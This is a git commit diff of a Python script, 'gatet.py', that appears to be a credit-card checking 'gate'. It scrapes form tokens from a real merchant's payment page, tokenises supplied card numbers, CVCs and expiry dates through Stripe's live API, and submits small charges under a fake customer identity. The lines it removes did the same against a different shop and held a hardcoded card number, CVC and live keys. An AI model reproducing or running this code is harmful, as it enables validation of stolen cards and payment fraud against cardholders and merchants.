ade40b2582632adddc7700bd192414adc72d3a41
Daokhaosaard13 <daokhaosaard13@gmail.com>
2025-05-01 23:34:33 +0700

    Update gatet.py

--- gatet.py
+++ gatet.py
@@ -11,6 +11,32 @@ def Tele(ccx):
 	r = requests.session()
 	
 	headers = {
+	    'authority': 'crownguardians.co.uk',
+	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'cache-control': 'max-age=0',
+	    'if-modified-since': 'Thu, 01 May 2025 15:11:53 GMT',
+	    'referer': 'https://www.google.com/',
+	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	            'sec-fetch-dest': 'document',
+	    'sec-fetch-mode': 'navigate',
+	    'sec-fetch-site': 'cross-site',
+	    'sec-fetch-user': '?1',
+	    'upgrade-insecure-requests': '1',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
+	 }
+	        
+	response = requests.get('https://crownguardians.co.uk/payment', headers=headers)
+	        
+	r = response.text
+	xid = re.search(r'name="XID" value="(.*?)"/>', r)
+	xid = xid.group(1)
+	p = re.search(r'name="P" value="(.*?)"/>', r)
+	p = p.group(1)
+	
+	headers = {
 	    'authority': 'api.stripe.com',
 	    'accept': 'application/json',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
@@ -25,20 +51,20 @@ def Tele(ccx):
 	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	}
-	
-	data = 'type=card&card[number]=5284973003220104&card[cvc]=642&card[exp_month]=06&card[exp_year]=25&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&key=pk_live_51MyWZrJ52F9ZB0n07Hd0bDZxUwGNghNCcFDPnibONN3Wa9Vvj4yfQp3ZoA3WMGtuICDDH2nCezFYUFeJnhiwyXTw00gsD6iHLJ'
-	
-	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-	
-	pm = r1.json()['id']
-	
+	        
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F1cb064bd1e%3B+stripe-js-v3%2F1cb064bd1e%3B+card-element&key=pk_live_OUVwqtzyMwDDyB0lkOcoZ9lX'
+	        
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	        
+	pm = response.json()['id']
+	        
 	headers = {
-	    'authority': 'ornamentspa.eu',
-	    'accept': '*/*',
+	    'authority': 'crownguardians.co.uk',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
 	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
 	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-	    'origin': 'https://ornamentspa.eu',
-	    'referer': 'https://ornamentspa.eu/ponudba/darilni-boni/',
+	    'origin': 'https://crownguardians.co.uk',
+	    'referer': 'https://crownguardians.co.uk/payment',
 	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
@@ -48,18 +74,24 @@ def Tele(ccx):
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
 	    'x-requested-with': 'XMLHttpRequest',
 	}
-	
+	        
 	params = {
-	    't': '1746049232983',
+	    'ACT': '24',
 	}
+	        
+	data = {
+	    'XID': xid,
+	    'ret': 'payment%2Fcomplete',
+	    'ret_error': 'https%3A%2F%2Fcrownguardians.co.uk%2Fpayment',
+	    'P': p,
+	    'customer_name': 'Rodam User',
+	    'customer_email': 'rodamuser08@gmail.com',
+	    'plan_amount': '1',
+	    'meta:reference': 'Coach',
+	    'meta:invoice': '1',
+	    'card_token': pm,
+	}
+	        
+	response = requests.post('https://crownguardians.co.uk/', params=params, headers=headers, data=data)
 	
-	data = 'data=__fluent_form_embded_post_id%3D32%26_fluentform_5_fluentformnonce%3Dd3afc7d421%26_wp_http_referer%3D%252Fponudba%252Fdarilni-boni%252F%26names%255Bfirst_name%255D%3DRodam%2520User%26email%3Drodamuser08%2540gmail.com%26address_1%255Baddress_line_1%255D%3DStreet%252027%26address_1%255Bcity%255D%3DNew%2520York%26address_1%255Bzip%255D%3D1008%26input_text%3D4303000850%26input_radio%3DV%2520vrednosti%2520(%25E2%2582%25AC)%26numeric-field%3D20%26input_radio_1%3DPo%2520e-po%25C5%25A1ti%2520(natisne%25C5%25A1%2520ga%2520sam-a)%26terms-n-condition%3Don%26checkbox%255B%255D%3DNe%2520%25C5%25BEelim%2520se%2520prijaviti%2520na%2520novice%2520in%2520prejemati%2520koristne%2520vsebine%26hidden%3D%26numeric-field_1%3D20%252C00%26input_radio_2%3DCredit%2520Card%2520(Stripe)%26payment_method%3Dstripe%26custom-payment-amount_2%3D0.01%26__stripe_payment_method_id%3Dpm_1RJiMnJ52F9ZB0n091cQE9sz&action=fluentform_submit&form_id=5'
-	
-	r2 = requests.post(
-	    'https://ornamentspa.eu/wp-admin/admin-ajax.php',
-	    params=params,
-	    headers=headers,
-	    data=data,
-	)
-	
-	return (r2.json())
+	return (response.json())
